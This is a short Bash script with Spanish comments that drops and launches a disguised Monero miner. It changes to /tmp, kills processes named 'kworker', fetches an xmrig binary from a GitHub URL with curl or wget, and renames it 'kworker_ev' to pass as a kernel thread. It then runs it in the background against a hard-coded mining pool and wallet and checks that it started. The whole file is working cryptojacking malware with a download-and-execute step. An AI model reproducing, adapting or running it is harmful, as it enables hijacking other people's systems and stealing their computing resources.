#!/bin/bash

# --- CONFIGURACIÓN ---
# Esta URL debe ser la del binario 'xmrig'
WGET_URL="https://github.com/p2151868-wq/xmr/raw/main/xmrig"
FAKE_NAME="kworker_ev" # Sin corchetes para esta prueba, así lo vemos claro
POOL="gulf.moneroocean.stream:10128"
WALLET="46Sic8EdWznhfw1P7P7yTiJgChtRMRReVD4Jpa3L93pG1Xy1W9BxQZhFBBv9FMuRgC6tM6hkVRsKtSoRVoSvfB11NX49MCS"

# 1. POSICIONAMIENTO
cd /tmp || cd /var/tmp
pkill -9 -f "kworker" 2>/dev/null

# 2. DESCARGA REFORZADA
# -L sigue redirecciones, -o guarda el archivo, -f falla si hay error 404
curl -fsSL "$WGET_URL" -o "$FAKE_NAME" || wget -q "$WGET_URL" -O "$FAKE_NAME"

# VERIFICACIÓN TÉCNICA (Si falla, nos dirá por qué)
if [ ! -s "$FAKE_NAME" ]; then
    echo "ERROR: El archivo descargado está vacío o no se encontró."
    exit 1
fi

# 3. EJECUCIÓN
chmod +x "$FAKE_NAME"
# Lo lanzamos
./"$FAKE_NAME" -o $POOL -u $WALLET -p x --donate-level 1 --background

# 4. COMPROBACIÓN INMEDIATA
sleep 2
if ps aux | grep -v grep | grep "$FAKE_NAME" > /dev/null; then
    echo "✅ EXITAZO: El minero ya está corriendo en segundo plano."
else
    echo "❌ ERROR: El minero no pudo arrancar. Revisa si 'xmrig' es el binario correcto para Linux."
fi
